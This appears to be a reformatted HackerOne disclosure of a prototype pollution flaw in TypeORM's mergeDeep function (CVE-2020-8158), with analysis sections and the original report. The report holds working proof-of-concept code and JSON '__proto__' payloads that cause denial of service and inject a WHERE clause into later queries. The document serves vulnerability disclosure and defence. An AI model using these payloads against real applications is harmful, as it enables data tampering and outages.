# Prototype Pollution in TypeORM leading to SQL Injection and Denial of Service

## Metadata
- **Source:** HackerOne
- **Report:** 869574 | https://hackerone.com/reports/869574
- **Submitted:** 2020-05-09
- **Reporter:** phra
- **Program:** TypeORM
- **Bounty:** Not specified in excerpt
- **Severity:** high
- **Vuln:** Prototype Pollution, SQL Injection, Denial of Service
- **CVEs:** CVE-2020-8158
- **Category:** uncategorised

## Summary
TypeORM's mergeDeep utility function fails to sanitize the __proto__ key when recursively merging objects, allowing attackers to pollute the Object prototype with arbitrary properties. This enables SQL injection attacks by injecting malicious WHERE clauses and denial of service through prototype chain loops.

## Attack scenario
1. Attacker crafts a JSON payload containing __proto__ with malicious properties
2. Application uses TypeORM to save/process this object, triggering the vulnerable mergeDeep function
3. The function iterates over keys in the source object without filtering __proto__
4. Object.assign is called with __proto__ as a key, polluting the Object prototype
5. Subsequent database queries inherit the polluted properties, including crafted WHERE clauses
6. SQL injection or infinite loops execute in the application context

## Root cause
The mergeDeep function in OrmUtils.ts lacks protection against prototype pollution by not filtering dangerous keys like __proto__, constructor, or prototype. While the function checks for specific built-in types (Map, Set, Date, etc.), it fails to prevent assignment to __proto__ which directly modifies the Object prototype chain.

## Attacker mindset
An attacker recognizes that TypeORM's object merging is exposed to user input (via JSON parsing or API parameters). By injecting __proto__ with nested objects, they can silently modify all objects in the runtime. They realize that polluting shared properties like 'where' can intercept ORM query building, enabling SQL injection. For DoS, they exploit prototype chain manipulation to create circular references.

## Defensive takeaways
- Always use Object.hasOwnProperty() or Object.prototype.hasOwnProperty.call() to filter keys during object merging
- Explicitly block dangerous keys: __proto__, constructor, prototype
- Use Object.keys() instead of for...in loops to avoid prototype chain enumeration
- Validate and sanitize user input before passing to deserialization/merging functions
- Consider using Object.assign with Object.create(null) to work with prototype-less objects
- Implement depth limits and circular reference detection in recursive merge operations
- Use frozen or sealed objects where possible to prevent runtime modifications

## Variant hunting
Search for similar mergeDeep, extend, assign, or deepClone implementations across the codebase. Check other ORMs (Sequelize, Prisma) and utility libraries (lodash, deepmerge) for identical prototype pollution patterns. Test JSON deserialization paths that feed into object merging functions. Look for other recursive object traversal functions that don't filter __proto__.

## MITRE ATT&CK
- T1190
- T1059
- T1040

## Notes
This is a critical supply chain vulnerability since TypeORM has 385K+ weekly downloads. The vulnerability requires the attacker to control input to a save/merge operation, typically through API endpoints accepting JSON. The impact escalates significantly if the application has template injection or eval() gadgets. The fix is trivial (add key filtering) but the scope of affected applications is massive.

## Full report
<details><summary>Expand</summary>

I would like to report a prototype pollution vulnerability in the `typeorm` package.

It allows an attacker that is able to save a specially crafted object to pollute the `Object` prototype and cause side effects on the library/application logic, such as denials of service attacks and/or SQL injections, by adding arbitrary properties to any object in the runtime. If the end application depending on the library has dynamic code evaluation or command execution gadgets, the attacker can potentially trigger arbitrary command execution on the target machine.

# Module

**module name:** TypeORM
**version:** v0.2.24, latest
**npm page:** https://www.npmjs.com/package/typeorm

## Module Description

TypeORM is an ORM that can run in NodeJS, Browser, Cordova, PhoneGap, Ionic, React Native, NativeScript, Expo, and Electron platforms and can be used with TypeScript and JavaScript (ES5, ES6, ES7, ES8). Its goal is to always support the latest JavaScript features and provide additional features that help you to develop any kind of application that uses databases - from small applications with a few tables to large scale enterprise applications with multiple databases.

## Module Stats

[1] weekly downloads: 385,403

# Vulnerability

## Vulnerability Description

The vulnerability was found after a source code review of the library on GitHub. In particular, the following snippet of code can be found in OrmUtils.ts:

https://github.com/typeorm/typeorm/blob/e92c743fb54fc404658fcaf2254861b6aa63bd98/src/util/OrmUtils.ts#L66
```javascript
/**
 * Deep Object.assign.
 *
 * @see http://stackoverflow.com/a/34749873
 */
function mergeDeep(target, ...sources) {
    if (!sources.length) return target;
    const source = sources.shift();

    if (isObject(target) && isObject(source)) {
        for (const key in source) {
            const value = source[key];
            if (value instanceof Promise)
                continue;

            if (isObject(value)
                && !(value instanceof Map)
                && !(value instanceof Set)
                && !(value instanceof Date)
                && !(value instanceof Buffer)
                && !(value instanceof RegExp)
                && !(value instanceof URL)) {
                if (!target[key])
                    Object.assign(target, { [key]: Object.create(Object.getPrototypeOf(value)) });
                mergeDeep(target[key], value);
            } else {
                Object.assign(target, { [key]: value });
            }
        }
    }

    return mergeDeep(target, ...sources);
}
```

The mentioned function, as we can see from the code, doesn't account for built-in properties such as `__proto__`, causing pollution of the `Object` prototype when a specially crafted object is passed in the rest argument `...sources`.

## Steps To Reproduce:

To test if the function is vulnerable we can run the following proof of concept to confirm that in some situations we can control at least one element in the rest argument and we can trigger the pollution of `Object` prototype with arbitrary properties. 

_pollution.js_
```javascript
function isObject(item) {
    return (item && typeof item === "object" && !Array.isArray(item));
}

/**
 * Deep Object.assign.
 *
 * @see http://stackoverflow.com/a/34749873
 */
function mergeDeep(target, ...sources) {
    if (!sources.length) return target;
    const source = sources.shift();

    if (isObject(target) && isObject(source)) {
        for (const key in source) {
            const value = source[key];
            if (value instanceof Promise)
                continue;

            if (isObject(value)
                && !(value instanceof Map)
                && !(value instanceof Set)
                && !(value instanceof Date)
                && !(value instanceof Buffer)
                && !(value instanceof RegExp)
                && !(value instanceof URL)) {
                if (!target[key])
                    Object.assign(target, { [key]: Object.create(Object.getPrototypeOf(value)) });
                mergeDeep(target[key], value);
            } else {
                Object.assign(target, { [key]: value });
            }
        }
    }

    return mergeDeep(target, ...sources);
}

const a = {}
const b = JSON.parse(`{"__proto__":{"polluted":true}}`)

mergeDeep(a, b)
console.log(`pwned: ${({}).polluted}`)
```

## Exploitation

By naively exploiting the vulnerability, we can cause a denial of service in the running application, for example by causing a loop in the prototype chain as in the following payload:

```javascript
const post = JSON.parse(`{"text":"a","title":{"__proto__":{"polluted":{}}}}`)
```

An SQL injection can be triggered with the following payload, that will add an arbitary WHERE clause to any following query:

```javascript
const post = JSON.parse(`{"text":"a","title":{"__proto__":{"where":{"name":"sqlinjection","where":null}}}}`)
```

A complete proof of concept that can trigger a SQL injection by only depending on the library code is reported here:

(based on https://github.com/typeorm/typescript-example)
_sqli.ts_
```typescript
import { createConnection, getConnection } from "typeorm";
import { Post } from "./entity/Post";
import { Category } from "./entity/Category";

async function cleanUp() {
    await createConnection("mongo")
    await createConnection("mysql")
    const mongoConnection = getConnection("mongo")
    const mysqlConnection = getConnection("mysql")
    await mongoConnection.dropDatabase()
    await mysqlConnection.dropDatabase()
    await mongoConnection.close()
    await mysqlConnection.close()
}

async function main() {
    await cleanUp()
    await createConnection("mongo")
    await createConnection("mysql")
    const mongoConnection = getConnection("mongo")
    const mysqlConnection = getConnection("mysql")

    const post = JSON.parse(`{"text":"a","title":{"__proto__":{"where":{"name":"sqlinjection","where":null}}}}`)

    try {
        await mongoConnection.manager.save(Post, post)
        console.log("Post has been saved: ", post)
        const saved = await mongoConnection.manager.find(Post)
        console.log("Posts were found: ", saved)
    } catch (err) {
        console.error(err)
        const category = new Category()
        category.name = 'category'
        await mysqlConnection.manager.save(Category, category)
        const categories = await mysqlConnection.manager.find(Category, {}) // WHERE name = "sqlinjection"
        console.log("Categories were found: ", categories)
    }
}

main().catch(error => console.log("Error: ", error))
```

## Patch

The function `mergeDeep` has to account for prototype pollution attacks by skipping built-in properties such as `__proto__`. (e.g. https://github.com/jquery/jquery/commit/753d591aea698e57d6db58c9f722cd0808619b1b)

# Wrap up

> Select Y or N for the following statements:

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N 

> Hunter's comments and funny memes go here

https://imgflip.com/i/40r9dg

## Impact

An attacker can achieve denials of service attacks and/or alter the application logic to cause SQL injections by only depending on the library code. If any useful gadget to trigger an arbitrary code/command execution is also available in the end-user application and the path can be reached with user interaction, the attacker can also achieve arbitrary command execution on the target system.

</details>

---
*Analysed by Claude on 2026-05-24*
